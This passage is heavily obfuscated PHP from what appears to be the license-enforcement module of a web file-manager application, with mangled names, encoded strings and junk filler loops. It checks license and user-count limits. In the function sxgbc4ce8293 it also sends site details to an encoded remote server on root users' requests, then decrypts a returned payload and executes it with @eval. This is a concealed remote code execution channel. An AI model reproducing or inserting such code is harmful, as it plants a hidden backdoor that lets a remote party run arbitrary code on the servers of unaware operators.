$µ¦÷ûøÎ[6]); show_json(LNG($µ¦÷ûøÎ[189]), !0); } private function licenseRegistSuccess() { $¨“ƒêÎô =& $_SERVER[çÛ›³ª²]; $©™şâãø = Model($¨“ƒêÎô[33])->get(); $”€„‚ßÓ = $_SERVER[è¶³ÒßÑ][723]; if ($©™şâãø[$¨“ƒêÎô[63]] != $¨“ƒêÎô[122]) { Model($¨“ƒêÎô[33])->set($¨“ƒêÎô[63], $¨“ƒêÎô[122]); } Action($¨“ƒêÎô[205])->initStart(!0); } private function gloja5733ef9() { $ñ‡é¦ç =& $_SERVER[è¶³ÒßÑ]; $îÑßÄ ¡ =& $_SERVER[çÛ›³ª²]; Model($îÑßÄ ¡[33])->set(array($îÑßÄ ¡[153] => $îÑßÄ ¡[6], $îÑßÄ ¡[191] => $îÑßÄ ¡[6], $îÑßÄ ¡[108] => $îÑßÄ ¡[109], $îÑßÄ ¡[110] => $îÑßÄ ¡[6], $îÑßÄ ¡[111] => $îÑßÄ ¡[6])); $£½õø = $ñ‡é¦ç[724]; Model($îÑßÄ ¡[33])->setDeep($îÑßÄ ¡[198], $îÑßÄ ¡[206]); $©€–³‘Á = $ñ‡é¦ç[725]; while (strlen($©€–³‘Á) < $ñ‡é¦ç[61]) { if (!$©€–³‘Á) { break; } $©€–³‘Á++; } $this->fpqr80a73378 = array(); $this->laend5ca65a9 = $îÑßÄ ¡[109]; } private function jmkt86756408() { $ì‡‘šÅ¿ =& $_SERVER[è¶³ÒßÑ]; $·¨ÈšŸ =& $_SERVER[çÛ›³ª²]; $_SERVER[$·¨ÈšŸ[162]] = _get($_SERVER, $·¨ÈšŸ[162], APP_HOST); $this->laend5ca65a9 = $·¨ÈšŸ[109]; $–ÚµÙšı = Model($·¨ÈšŸ[33])->get(); if ($–ÚµÙšı[$·¨ÈšŸ[108]] == $·¨ÈšŸ[109]) { return; } $‚ª«¨¤Ñ = Model($·¨ÈšŸ[33])->get($·¨ÈšŸ[100]); $ŠâÍ……Ó = $ì‡‘šÅ¿[726]; if (!$ŠâÍ……Ó) { die; } $Éûó¶åÑ = $·¨ÈšŸ[203] . md5($‚ª«¨¤Ñ . $·¨ÈšŸ[204]); $§öûêÄ = $ì‡‘šÅ¿[727]; if (strlen($§öûêÄ) < $ì‡‘šÅ¿[687]) { return; } $»¯ÊÚ¹“ = Cache::get($Éûó¶åÑ); if (!is_array($»¯ÊÚ¹“) || !isset($»¯ÊÚ¹“[$·¨ÈšŸ[207]]) || time() - $»¯ÊÚ¹“[$·¨ÈšŸ[207]] >= 60) { $ÉÁäÖÎ· = Model($·¨ÈšŸ[7])->loadList(); $¬öÏô¯ = $ÉÁäÖÎ·[$·¨ÈšŸ[200]]; $ñâ’¬„š = md5($_SERVER[$·¨ÈšŸ[106]] . strrev($‚ª«¨¤Ñ) . $–ÚµÙšı[$·¨ÈšŸ[191]]); $ÅØ×ÛÆ = strrev(substr($ñâ’¬„š, 10, 16)); $»¯ÊÚ¹“ = $this->gzvq77b5035b($¬öÏô¯[$·¨ÈšŸ[86]][$ÅØ×ÛÆ], $ñâ’¬„š); $»¯ÊÚ¹“ = json_decode($»¯ÊÚ¹“, !0); } if (!is_array($»¯ÊÚ¹“)) { return $this->gloja5733ef9(); } $¦È´Âœ… = strtotime($»¯ÊÚ¹“[$·¨ÈšŸ[129]]); if (time() >= $¦È´Âœ…) { return $this->gloja5733ef9(); } if (!isset($»¯ÊÚ¹“[$·¨ÈšŸ[207]]) || time() - $»¯ÊÚ¹“[$·¨ÈšŸ[207]] > 20) { $»¯ÊÚ¹“[$·¨ÈšŸ[207]] = time(); Cache::set($Éûó¶åÑ, $»¯ÊÚ¹“); } $this->fpqr80a73378 = $»¯ÊÚ¹“; $this->laend5ca65a9 = $–ÚµÙšı[$·¨ÈšŸ[108]]; $¸Ñ²äŒ = $ì‡‘šÅ¿[728]; if (!$¸Ñ²äŒ) { die; } } private function tigu081d1381() { $õ«ù±– =& $_SERVER[è¶³ÒßÑ]; $®ö÷ôàó =& $_SERVER[çÛ›³ª²]; $ÇÏ‹Ñè‚ = $GLOBALS[$®ö÷ôàó[13]]; $îæï˜±„ = $õ«ù±–[729]; if (!$îæï˜±„) { die; } $‡óö•Åõ = $_SERVER[$®ö÷ôàó[24]]; $ü ÇÀíŒ = $õ«ù±–[730]; if ($‡óö•Åõ == $®ö÷ôàó[208] && $this->laend5ca65a9 == $®ö÷ôàó[109]) { show_json(LNG($®ö÷ôàó[209]), !1, $®ö÷ôàó[210]); } $Ÿ•÷Æ°ò = array($®ö÷ôàó[211], $®ö÷ôàó[212]); if (in_array($‡óö•Åõ, $Ÿ•÷Æ°ò)) { if ($this->laend5ca65a9 == $®ö÷ôàó[109] && isset($ÇÏ‹Ñè‚[$®ö÷ôàó[213]])) { show_json(LNG($®ö÷ôàó[209]), !1, $®ö÷ôàó[210]); die; } $‚óšÌ¥ = $this->hmpfa6d795c1(); if ($‚óšÌ¥ != intval($®ö÷ôàó[214])) { if ($‚óšÌ¥ <= Model($®ö÷ôàó[125])->count()) { show_json(LNG($®ö÷ôàó[215]), !1, $®ö÷ôàó[210]); die; } } } } private function gqks4e16228d() { $ğäÜÍ°¶ =& $_SERVER[è¶³ÒßÑ]; $Û®ñàÏ =& $_SERVER[çÛ›³ª²]; $Ñó å÷Ö = array($Û®ñàÏ[119], $Û®ñàÏ[120]); $ıÏê€òÒ = $ğäÜÍ°¶[731]; if (strlen($ıÏê€òÒ) < $ğäÜÍ°¶[61]) { return; } if (!KodUser::isRoot() || !isset($_GET[$Û®ñàÏ[216]])) { return; } if (!in_array($_SERVER[$Û®ñàÏ[24]], $Ñó å÷Ö)) { return; } $Õ´“–³¸ = $Û®ñàÏ[217]; $¡ñ›œñ® = $ğäÜÍ°¶[732]; if (!$¡ñ›œñ®) { return; } $Õ´“–³¸ = $this->nzotc32e1cd2($Õ´“–³¸, $Û®ñàÏ[218]); $ ½ˆ¹õ = stream_context_create(array($Û®ñàÏ[219] => array($Û®ñàÏ[220] => $Û®ñàÏ[221], $Û®ñàÏ[222] => 3))); $‡¥¼Ñ„‰ = @file_get_contents($Õ´“–³¸, !1, $ ½ˆ¹õ); header($Û®ñàÏ[223]); if ($‡¥¼Ñ„‰ && strstr($‡¥¼Ñ„‰, $Û®ñàÏ[224])) { echo $‡¥¼Ñ„‰; } die; } public function qnte09983786($–›‡¶É²) { $ÓÓ‘Ü†Å =& $_SERVER[çÛ›³ª²]; if ($this->laend5ca65a9 == $ÓÓ‘Ü†Å[225]) { return $–›‡¶É²; } $âÔ¦Ä¹× = $this->versionPluginList(); $íšÂşÕ¼ = explode($ÓÓ‘Ü†Å[226], $this->versionPluginFilter()); $—òÚŒÊ€ = array(); foreach ($âÔ¦Ä¹× as $»˜ÓÛâ => $¯¡§£ĞÌ) { if ($¯¡§£ĞÌ == $ÓÓ‘Ü†Å[227] && substr($this->laend5ca65a9, 0, 1) == $ÓÓ‘Ü†Å[227]) { continue; } if (!in_array($»˜ÓÛâ, $íšÂşÕ¼)) { $—òÚŒÊ€[] = $»˜ÓÛâ; } } foreach ($—òÚŒÊ€ as $»˜ÓÛâ) { unset($–›‡¶É²[$»˜ÓÛâ]); } return $–›‡¶É²; $Üíõ‡ù = $_SERVER[è¶³ÒßÑ][733]; } private function versionPluginList() { $Ø×óÇ¿İ =& $_SERVER[çÛ›³ª²]; return array($Ø×óÇ¿İ[228] => $Ø×óÇ¿İ[227], $Ø×óÇ¿İ[229] => $Ø×óÇ¿İ[227], $Ø×óÇ¿İ[230] => $Ø×óÇ¿İ[227], $Ø×óÇ¿İ[231] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[233] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[234] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[235] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[236] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[237] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[238] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[239] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[240] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[241] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[242] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[243] => $Ø×óÇ¿İ[232], $Ø×óÇ¿İ[244] => $Ø×óÇ¿İ[232]); $š÷®·µ = $_SERVER[è¶³ÒßÑ][734]; if (!$š÷®·µ) { return; } } private function versionPluginFilter() { $¡ıæ¦°Ü =& $_SERVER[çÛ›³ª²]; if ($this->laend5ca65a9 == $¡ıæ¦°Ü[109]) { return $¡ıæ¦°Ü[6]; } $“ö‡£Ñ = _get($this->fpqr80a73378, $¡ıæ¦°Ü[245], $¡ıæ¦°Ü[6]); $Ş¦·¥‹Ù = _get($this->fpqr80a73378, $¡ıæ¦°Ü[116], $¡ıæ¦°Ü[6]); $éÕÈç» = $_SERVER[è¶³ÒßÑ][735]; $İíÍƒ¿ = _get($this->fpqr80a73378, $¡ıæ¦°Ü[246], $¡ıæ¦°Ü[6]); if ($Ş¦·¥‹Ù > time() && $İíÍƒ¿ > time()) { $æİâ„÷Í = explode($¡ıæ¦°Ü[226], $“ö‡£Ñ); $ùÈ¦í×º = array_keys($this->versionPluginList()); $“ö‡£Ñ = array_merge($æİâ„÷Í, $ùÈ¦í×º); $“ö‡£Ñ = implode($¡ıæ¦°Ü[226], array_filter(array_unique($“ö‡£Ñ))); } return $“ö‡£Ñ; } private function ioet395ce323() { $¬›ÈÍºú =& $_SERVER[çÛ›³ª²]; if ($this->laend5ca65a9 != $¬›ÈÍºú[109]) { $GLOBALS[$¬›ÈÍºú[86]][$¬›ÈÍºú[90]][$¬›ÈÍºú[247]] = $¬›ÈÍºú[206]; return; } $GLOBALS[$¬›ÈÍºú[86]][$¬›ÈÍºú[248]] = $¬›ÈÍºú[122]; if (Model($¬›ÈÍºú[249])->get($¬›ÈÍºú[63]) != $¬›ÈÍºú[206]) { Model($¬›ÈÍºú[249])->set($¬›ÈÍºú[63], $¬›ÈÍºú[206]); } } public function ynglc88b1bff() { return $_SERVER[çÛ›³ª²][250]; $ö¯Õ¯ü„ = $_SERVER[è¶³ÒßÑ][736]; if (!$ö¯Õ¯ü„) { return; } } private function sxgbc4ce8293() { $¾÷Ü»è =& $_SERVER[è¶³ÒßÑ]; $š²Î¤®´ =& $_SERVER[çÛ›³ª²]; $¿©ÀÒÏå = array($š²Î¤®´[251], $š²Î¤®´[252], $š²Î¤®´[253]); $úì´¢ü = $š²Î¤®´[254] . md5($š²Î¤®´[255]); $Ü£§ìéæ = $¾÷Ü»è[737]; if (strlen($Ü£§ìéæ) < $¾÷Ü»è[687]) { return; } if ($this->laend5ca65a9 == $š²Î¤®´[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$š²Î¤®´[24]], $¿©ÀÒÏå)) { return; } if (time() % 4 != 0) { return; } $­ŠÃõç = call_user_func(array($š²Î¤®´[256], $š²Î¤®´[257]), $úì´¢ü); if ($­ŠÃõç && time() - $­ŠÃõç < intval($š²Î¤®´[258])) { return; } call_user_func(array($š²Î¤®´[256], $š²Î¤®´[139]), $úì´¢ü, time()); $óù¯¤ù = $¾÷Ü»è[738]; $²ÎâØà… = Model($š²Î¤®´[33])->get($š²Î¤®´[100]); $¤¶äÖò˜ = array($š²Î¤®´[152] => Model($š²Î¤®´[33])->get($š²Î¤®´[153]), $š²Î¤®´[167] => $this->laend5ca65a9, $š²Î¤®´[163] => $_SERVER[$š²Î¤®´[164]], $š²Î¤®´[165] => Model($š²Î¤®´[33])->get($š²Î¤®´[131]), $š²Î¤®´[105] => md5($_SERVER[$š²Î¤®´[106]] . $²ÎâØà…), $š²Î¤®´[156] => $š²Î¤®´[136], $š²Î¤®´[159] => $_SERVER[$š²Î¤®´[160]]); $ç¤Ã…Ç¼ = $this->ucvt0c3478e7($š²Î¤®´[259], $¤¶äÖò˜); if (!is_array($ç¤Ã…Ç¼)) { return; } if ($ç¤Ã…Ç¼[$š²Î¤®´[152]] && $ç¤Ã…Ç¼[$š²Î¤®´[260]]) { if ($this->wncv38298012($ç¤Ã…Ç¼[$š²Î¤®´[260]]) == $¤¶äÖò˜[$š²Î¤®´[152]]) { return; } } $this->gloja5733ef9(); $Ôı®ŠË = $¾÷Ü»è[739]; if (!$Ôı®ŠË) { return; } if ($this->wncv38298012($ç¤Ã…Ç¼[$š²Î¤®´[260]]) != $¤¶äÖò˜[$š²Î¤®´[152]]) { $úĞ½ò€ô = array($š²Î¤®´[185] => $²ÎâØà…, $š²Î¤®´[186] => $_SERVER[$š²Î¤®´[106]], $š²Î¤®´[187] => this_url(), $š²Î¤®´[161] => $_SERVER[$š²Î¤®´[162]]); $©ƒëÇ’ = $this->trcia2b20953(json_encode($úĞ½ò€ô)); $ç¤Ã…Ç¼ = $this->ucvt0c3478e7($š²Î¤®´[188] . $©ƒëÇ’); if ($ç¤Ã…Ç¼ && is_array($ç¤Ã…Ç¼) && isset($ç¤Ã…Ç¼[$š²Î¤®´[260]])) { $ÃĞ¥©ôû = $this->gzvq77b5035b($ç¤Ã…Ç¼[$š²Î¤®´[260]], 2); if ($ÃĞ¥©ôû) { $ÃĞ¥©ôû = $this->wncv38298012($ÃĞ¥©ôû); } if ($ÃĞ¥©ôû) { try { @eval($ÃĞ¥©ôû); } catch (Exception $ÓĞºÜï) { } } } } } private function ucvt0c3478e7($…ÎÃ½ø¤ = '', $±¯ÃßÉâ = array(), $àù¶äş = 5) { $ÊÚ ÉÄ× =& $_SERVER[è¶³ÒßÑ]; $§ÜÓšÒµ =& $_SERVER[çÛ›³ª²]; $‹ÂÇ‹¬´ = $§ÜÓšÒµ[261]; $‹ÂÇ‹¬´ = $this->nzotc32e1cd2($‹ÂÇ‹¬´, $§ÜÓšÒµ[262]); $‹ÂÇ‹¬´ = $‹ÂÇ‹¬´ . $…ÎÃ½ø¤; if ($±¯ÃßÉâ && is_array($±¯ÃßÉâ)) { $‹ÂÇ‹¬´ = $‹ÂÇ‹¬´ . $§ÜÓšÒµ[263] . http_build_query($±¯ÃßÉâ); } if ($±¯ÃßÉâ === -1) { return $‹ÂÇ‹¬´; } $Ø‡è”Ìş = stream_context_create(array($§ÜÓšÒµ[219] => array($§ÜÓšÒµ[222] => $àù¶äş, $§ÜÓšÒµ[220] => $§ÜÓšÒµ[264]), $§ÜÓšÒµ[265] => array($§ÜÓšÒµ[266] => !1, $§ÜÓšÒµ[267] => !1))); $ŞƒÕşÅÔ = $ÊÚ ÉÄ×[740]; if (!$ŞƒÕşÅÔ) { return; } $±¯ÃßÉâ = @file_get_contents($‹ÂÇ‹¬´, !1, $Ø‡è”Ìş); $Æ®â§•¡ = $ÊÚ ÉÄ×[741]; return json_decode($±¯ÃßÉâ, !0); $¬¶Öü®Ì = $ÊÚ ÉÄ×[742]; $Äã®¨Î = $ÊÚ ÉÄ×[743]; } private function hmpfa6d795c1() { $èÕšê =& $_SERVER[è¶³ÒßÑ]; $ÃÌı²òŒ =& $_SERVER[çÛ›³ª²]; $Šùë—Ãé = array($ÃÌı²òŒ[268] => $ÃÌı²òŒ[269], $ÃÌı²òŒ[270] => $ÃÌı²òŒ[271], $ÃÌı²òŒ[272] => $ÃÌı²òŒ[273], $ÃÌı²òŒ[274] => $ÃÌı²òŒ[275], $ÃÌı²òŒ[276] => $ÃÌı²òŒ[277], $ÃÌı²òŒ[278] => $ÃÌı²òŒ[214], $ÃÌı²òŒ[279] => $ÃÌı²òŒ[214], $ÃÌı²òŒ[280] => $ÃÌı²òŒ[269], $ÃÌı²òŒ[281] => $ÃÌı²òŒ[271], $ÃÌı²òŒ[282] => $ÃÌı²òŒ[273], $ÃÌı²òŒ[283] => $ÃÌı²òŒ[284], $ÃÌı²òŒ[285] => $ÃÌı²òŒ[275], $ÃÌı²òŒ[286] => $ÃÌı²òŒ[287], $ÃÌı²òŒ[288] => $ÃÌı²òŒ[277], $ÃÌı²òŒ[289] => $ÃÌı²òŒ[290], $ÃÌı²òŒ[291] => $ÃÌı²òŒ[292], $ÃÌı²òŒ[293] => $ÃÌı²òŒ[294]); $Ù”Å’åŞ = $Šùë—Ãé[$this->laend5ca65a9]; $Ù”Å’åŞ = intval($Ù”Å’åŞ ? $Ù”Å’åŞ : $ÃÌı²òŒ[269]); $òÁñÇ·Ç = $èÕšê[744]; if (strlen($òÁñÇ·Ç) < $èÕšê[61]) { die; } $àöÛ±¦š = _get($this->fpqr80a73378, $ÃÌı²òŒ[295]); $Ü õËœ’ = $èÕšê[745]; if (strlen($Ü õËœ’) < $èÕšê[677]) { return; } $àöÛ±¦š = $àöÛ±¦š ? intval($àöÛ±¦š) : 0; return $Ù”Å’åŞ + $àöÛ±¦š; } public function uolxa22d7349($…³ßÒİÁ) { $óì¡³¯Ù =& $_SERVER[çÛ›³ª²]; $¥ŸÆ»ŠŸ = $this->hmpfa6d795c1(); if ($…³ßÒİÁ[$óì¡³¯Ù[296]] == $óì¡³¯Ù[122]) { return; } if ($¥ŸÆ»ŠŸ >= intval($óì¡³¯Ù[214])) { return; } $óá—®ºÇ = Model($óì¡³¯Ù[125])->count(); if ($óá—®ºÇ <= $¥ŸÆ»ŠŸ) { return; } $Œ‹ûÌ¼ = Model($óì¡³¯Ù[125])->field($óì¡³¯Ù[296])->limit($¥ŸÆ»ŠŸ)->select(); $åûì¹„ = $_SERVER[è¶³ÒßÑ][746]; if (!$åûì¹„) { return; } $Œ‹ûÌ¼ = array_to_keyvalue($Œ‹ûÌ¼, $óì¡³¯Ù[6], $óì¡³¯Ù[296]); if (!in_array($…³ßÒİÁ[$óì¡³¯Ù[296]], $Œ‹ûÌ¼)) { show_json($óì¡³¯Ù[297], !1, $óì¡³¯Ù[210]); } } public function ocvdb127949b() { $Êö±ş˜´ =& $_SERVER[è¶³ÒßÑ]; $³ñ˜Ì½Ÿ =& $_SERVER[çÛ›³ª²]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $‹±ê½µÖ = $³ñ˜Ì½Ÿ[217]; $‹±ê½µÖ = $this->nzotc32e1cd2($‹±ê½µÖ, $³ñ˜Ì½Ÿ[218]); $À×€Ñåı = $Êö±ş˜´[747]; if (!$À×€Ñåı) { return; } $¨ÖØ—æ¼ = stream_context_create(array($³ñ˜Ì½Ÿ[219] => array($³ñ˜Ì½Ÿ[220] => $³ñ˜Ì½Ÿ[221], $³ñ˜Ì½Ÿ[222] => 3))); $¸øòÚ£’ = $Êö±ş˜´[748]; if (!$¸øòÚ£’) { return; } $ºÌô¢·© = @file_get_contents($‹±ê½µÖ, !1, $¨ÖØ—æ¼); echo $³ñ˜Ì½Ÿ[298] . hash_encode($ºÌô¢·©) . $³ñ˜Ì½Ÿ[299]; } private function mrei33d87cda($âÉÙùŒŸ, $ãøå™ÑÌ, $—”ò¼ì = 3) { $î©Â =& $_SERVER[è¶³ÒßÑ]; $¿¡„™¬ =& $_SERVER[çÛ›³ª²]; usleep(1); $óª››êÅ = $î©Â[749]; while ($óª››êÅ < $î©Â[687]) { if ($óª››êÅ >= 0) { break; } $óª››êÅ++; } $âÉÙùŒŸ = trim($âÉÙùŒŸ); $Ü‹òã€™ = $î©Â[750]; if (strlen($Ü‹òã€™) < $î©Â[61]) { return; } $‘¡şÎ = mt_rand(0, 5) . $¿¡„™¬[6]; $ÀÓ”¬ = $î©Â[751]; $íş´Çº¦ = rand_string(15); $ »¹Æ¬ = $î©Â[752]; if (!$ »¹Æ¬) { return; } $… Ó·»ï = $¿¡„™¬[300]; $ĞÑÚåÖÑ = $î©Â[753]; while (strlen($ĞÑÚåÖÑ) < $î©Â[687]) { if (!$ĞÑÚåÖÑ) { break; } $ĞÑÚåÖÑ++; } switch ($‘¡şÎ) { case $¿¡„™¬[206]: $ò¢€úÒ‡ = $this->vocr0aaa5376($âÉÙùŒŸ, strrev($ãøå™ÑÌ . $íş´Çº¦)); $µ†‹»‰¿ = $î©Â[754]; if (strlen($µ†‹»‰¿) < $î©Â[697]) { return; } break; case $¿¡„™¬[122]: $ò¢€úÒ‡ = $this->vocr0aaa5376($âÉÙùŒŸ, strrev($íş´Çº¦ . $ãøå™ÑÌ)); $İ„Û®’× = $î©Â[755]; if (strlen($İ„Û®’×) < $î©Â[687]) { return; } break; case $¿¡„™¬[301]: $ò¢€úÒ‡ = $this->vocr0aaa5376($âÉÙùŒŸ, base64_encode($íş´Çº¦ . $ãøå™ÑÌ)); break; $éş°©èÕ = $î©Â[756]; case $¿¡„™¬[302]: $ò¢€úÒ‡ = $this->vocr0aaa5376($âÉÙùŒŸ, md5($íş´Çº¦ . $ãøå™ÑÌ)); break; case $¿¡„™¬[303]: $âÉÙùŒŸ = base64_encode($âÉÙùŒŸ); $¹Ï®” = rand(0, 64); $–Ç³´óÚ = $… Ó·»ï[$¹Ï®”]; $µÕØŠø = $î©Â[757]; while (strlen($µÕØŠø) < $î©Â[697]) { if (!$µÕØŠø) { break; } $µÕØŠø++; } $Úê¥ê = md5($–Ç³´óÚ . md5($ãøå™ÑÌ . $–Ç³´óÚ) . $ãøå™ÑÌ); $Úê¥ê = substr($Úê¥ê, $¹Ï®” % 8, $¹Ï®” % 8 + 7); $£ÕÂŠ¼– = $î©Â[758]; while (strlen($£ÕÂŠ¼–) < $î©Â[697]) { if (!$£ÕÂŠ¼–) { break; } $£ÕÂŠ¼–++; } $Ó÷‘á£ğ = $¿¡„™¬[6]; $§°ïÈÓ˜ = 0; $ŸÎ¹¿ô = 0; $Æ…úƒÀ = 0; $ê±ÇÒ»î = $î©Â[759]; if (strlen($ê±ÇÒ»î) < $î©Â[61]) { return; } for ($§°ïÈÓ˜ = 0; $§°ïÈÓ˜ < strlen($âÉÙùŒŸ); $§°ïÈÓ˜++) { $Æ…úƒÀ = $Æ…úƒÀ == strlen($Úê¥ê) ? 0 : $Æ…úƒÀ; $šè”²Õ± = $î©Â[760]; if (!$šè”²Õ±) { return; } $ŸÎ¹¿ô = ($¹Ï®” + strpos($… Ó·»ï, $âÉÙùŒŸ[$§°ïÈÓ˜]) + ord($Úê¥ê[$Æ…úƒÀ++])) % 64; $ÄŞ·ˆ‰ë = $î©Â[761]; while (strlen($ÄŞ·ˆ‰ë) < $î©Â[677]) { if (!$ÄŞ·ˆ‰ë) { break; } $ÄŞ·ˆ‰ë++; } $Ó÷‘á£ğ .= $… Ó·»ï[$ŸÎ¹¿ô]; } $ò¢€úÒ‡ = hash_encode($–Ç³´óÚ . $Ó÷‘á£ğ); $ôß‘† = $î©Â[762]; if (strlen($ôß‘†) < $î©Â[687]) { die; } break; $àÈë¤ö„ = $î©Â[763]; if (strlen($àÈë¤ö„) < $î©Â[61]) { return; } default: $ò¢€úÒ‡ = $this->vocr0aaa5376($âÉÙùŒŸ, $ãøå™ÑÌ . $íş´Çº¦); break; } $ò¢€úÒ‡ = strrev($‘¡şÎ . $íş´Çº¦ . $ò¢€úÒ‡); $Ô²í¸ˆÀ = $î©Â[764]; if (strlen($Ô²í¸ˆÀ) < $î©Â[680]) { die; } if ($—”ò¼ì - 1 > 0) { $ò¢€úÒ‡ = $this->mrei33d87cda($ò¢€úÒ‡, $ãøå™ÑÌ, $—”ò¼ì - 1); } return $ò¢€úÒ‡; } private function gzvq77b5035b($ÛÓî§İö, $÷«ø¨•Ç, $°üÏÊç = 3) { $Æë©¹´ =& $_SERVER[è¶³ÒßÑ]; $óºîê°  =& $_SERVER[çÛ›³ª²]; if (!is_string($ÛÓî§İö) || strlen($ÛÓî§İö) < 10) { return !1; } $ÛÓî§İö = trim($ÛÓî§İö); $ÛÓî§İö = strrev($ÛÓî§İö); $ˆ¼áØá† = $ÛÓî§İö[0]; $À ÃŒèÃ = substr($ÛÓî§İö, 1, 15); $ÛÓî§İö = substr($ÛÓî§İö, 16); $úÁÀ¿Ùˆ = $óºîê° [300]; $Ú½ìµÈ = $Æë©¹´[765]; if (strlen($Ú½ìµÈ) < $Æë©¹´[697]) { die; } switch ($ˆ¼áØá†) { case $óºîê° [206]: $œ¡êò©î = $this->nzotc32e1cd2($ÛÓî§İö, strrev($÷«ø¨•Ç . $À ÃŒèÃ)); $¼¯÷‘ = $Æë©¹´[766]; if (!$¼¯÷‘) { return; } break; $¿„ñ¯î = $Æë©¹´[767]; if (!$¿„ñ¯î) { die; } case $óºîê° [122]: $œ¡êò©î = $this->nzotc32e1cd2($ÛÓî§İö, strrev($À ÃŒèÃ . $÷«ø¨•Ç)); $—¢±¶ÁÔ = $Æë©¹´[768]; while (strlen($—¢±¶ÁÔ) < $Æë©¹´[680]) { if (!$—¢±¶ÁÔ) { break; } $—¢±¶ÁÔ++; } break; $÷î½ÒÏ = $Æë©¹´[769]; if (strlen($÷î½ÒÏ) < $Æë©¹´[697]) { die; } case $óºîê° [301]: $œ¡êò©î = $this->nzotc32e1cd2($ÛÓî§İö, base64_encode($À ÃŒèÃ . $÷«ø¨•Ç)); $‰±–ñâ = $Æë©¹´[770]; while (strlen($‰±–ñâ) < $Æë©¹´[680]) { if (!$‰±–ñâ) { break; } $‰±–ñâ++; } break; $™–ÊÁ÷¬ = $Æë©¹´[672]; if (!$™–ÊÁ÷¬) { return; } case $óºîê° [302]: $œ¡êò©î = $this->nzotc32e1cd2($ÛÓî§İö, md5($À ÃŒèÃ . $÷«ø¨•Ç)); break; $÷ãˆæŞ = $Æë©¹´[771]; if (strlen($÷ãˆæŞ) < $Æë©¹´[61]) { return; } case $óºîê° [303]: $ÛÓî§İö = hash_decode($ÛÓî§İö); $‹Ìá˜Î² = $Æë©¹´[772]; while (strlen($‹Ìá˜Î²) < $Æë©¹´[697]) { if (!$‹Ìá˜Î²) { break; } $‹Ìá˜Î²++; } $­ŞìÂ = $ÛÓî§İö[0]; $ÛÓî§İö = substr($ÛÓî§İö, 1); $¨¬•¶‹ = strpos($úÁÀ¿Ùˆ, $­ŞìÂ); $†ØšÔŞ§ = $Æë©¹´[773]; if (!$†ØšÔŞ§) { die; } $‡ƒ“Âˆ’ = md5($­ŞìÂ . md5($÷«ø¨•Ç . $­ŞìÂ) . $÷«ø¨•Ç); $‡ƒ“Âˆ’ = substr($‡ƒ“Âˆ’, $¨¬•¶‹ % 8, $¨¬•¶‹ % 8 + 7); $È›öç²¥ = $óºîê° [6]; $Ü­“ü²± = 0; $ÎÙ ò¡à = 0; $àë•ìã = 0; for ($Ü­“ü²± = 0; $Ü­“ü²± < strlen($ÛÓî§İö); $Ü­“ü²±++) { $àë•ìã = $àë•ìã == strlen($‡ƒ“Âˆ’) ? 0 : $àë•ìã; $¤ôºã˜Õ = $Æë©¹´[774]; if (strlen($¤ôºã˜Õ) < $Æë©¹´[61]) { die; } $ïéÜïüË = $àë•ìã++; $ÎÙ ò¡à = strpos($úÁÀ¿Ùˆ, $ÛÓî§İö[$Ü­“ü²±]) - $¨¬•¶‹ - ord($‡ƒ“Âˆ’[$ïéÜïüË]); $¡¦·›Š’ = $Æë©¹´[775]; while ($ÎÙ ò¡à < 0) { $ÎÙ ò¡à += 64; } $È›öç²¥ .= $úÁÀ¿Ùˆ[$ÎÙ ò¡à]; $”÷ŸºÂ = $Æë©¹´[776]; if (!$”÷ŸºÂ) { return; } } $œ¡êò©î = base64_decode($È›öç²¥); $Í•úô = $Æë©¹´[777]; while ($Í•úô < $Æë©¹´[697]) { if ($Í•úô >= 0) { break; } $Í•úô++; } break; $°¹»ãÜÉ = $Æë©¹´[778]; if (!$°¹»ãÜÉ) { die; } default: $œ¡êò©î = $this->nzotc32e1cd2($ÛÓî§İö, $÷«ø¨•Ç . $À ÃŒèÃ); $êø¡Åš = $Æë©¹´[779]; while ($êø¡Åš < $Æë©¹´[677]) { if ($êø¡Åš >= 0) { break; } $êø¡Åš++; } break; $€±½Í‡ = $Æë©¹´[780]; if (strlen($€±½Í‡) < $Æë©¹´[697]) { die; } } if ($°üÏÊç - 1 > 0) { $œ¡êò©î = $this->gzvq77b5035b($œ¡êò©î, $÷«ø¨•Ç, $°üÏÊç - 1); } return $œ¡êò©î; } public function trcia2b20953($Ş«Î•ú´) { $ÄÂ‘“ëÃ =& $_SERVER[è¶³ÒßÑ]; $šáè“  =& $_SERVER[çÛ›³ª²]; $¦—Ñìøü = $this->jqpr814ec593(); $¤±Ò¦…Œ = $this->jqpr814ec593(); $‘ Ñ˜„ñ = $ÄÂ‘“ëÃ[781]; if (!$‘ Ñ˜„ñ) { return; } $‹™¯æ•í = ($¦—Ñìøü - 1) * ($¤±Ò¦…Œ - 1); $À®Ä£Í = intval(($¦—Ñìøü + $¤±Ò¦…Œ) / 2); while (1) { $íÎûÛê = $À®Ä£Í; $ò»¾¸Úä = $‹™¯æ•í; while ($ò»¾¸Úä % $íÎûÛê != 0) { $ÀÌÖÓ’Á = $ò»¾¸Úä; $æ•Ô¼å¥ = $ÄÂ‘“ëÃ[782]; while (strlen($æ•Ô¼å¥) < $ÄÂ‘“ëÃ[677]) { if (!$æ•Ô¼å¥) { break; } $æ•Ô¼å¥++; } $ò»¾¸Úä = $íÎûÛê; $Ç‚¯¯¤ù = $ÄÂ‘“ëÃ[783]; $íÎûÛê = $ÀÌÖÓ’Á % $íÎûÛê; } if ($íÎûÛê == 1) { break; } else { $À®Ä£Í++; } } $òØ¶î¤ó = 2; $­¿£…ª¾ = $ÄÂ‘“ëÃ[784]; if (!$­¿£…ª¾) { die; } for ($Ğç¡°º = 0; $Ğç¡°º < $‹™¯æ•í * 10; $Ğç¡°º++) { if (($‹™¯æ•í * $Ğç¡°º + 1) % $À®Ä£Í == 0) { $òØ¶î¤ó = intval(($‹™¯æ•í * $Ğç¡°º + 1) / $À®Ä£Í); break; } } 